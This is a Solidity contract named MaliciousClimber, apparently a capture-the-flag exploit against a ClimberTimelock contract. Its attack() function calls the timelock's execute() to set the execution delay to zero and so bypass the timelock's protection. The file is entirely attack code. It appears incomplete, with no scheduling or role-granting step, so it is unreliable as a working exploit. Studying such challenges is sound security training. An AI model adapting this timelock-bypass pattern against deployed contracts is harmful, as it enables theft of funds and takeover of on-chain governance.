// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract MaliciousClimber {
    address timelock;
    uint8 constant ACTIONS = 1;

    constructor(address _timelock) {
        timelock = _timelock;
    }

    function attack() external {
        address[] memory targets = new address[](ACTIONS);
        uint256[] memory values = new uint256[](ACTIONS);
        bytes[] memory datas = new bytes[](ACTIONS);
        bytes32 salt;
        {
            targets[0] = timelock;
            values[0] = 0;
            datas[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
        }
        ClimberTimelock(payable(timelock)).execute(targets, values, datas, salt);
    }
}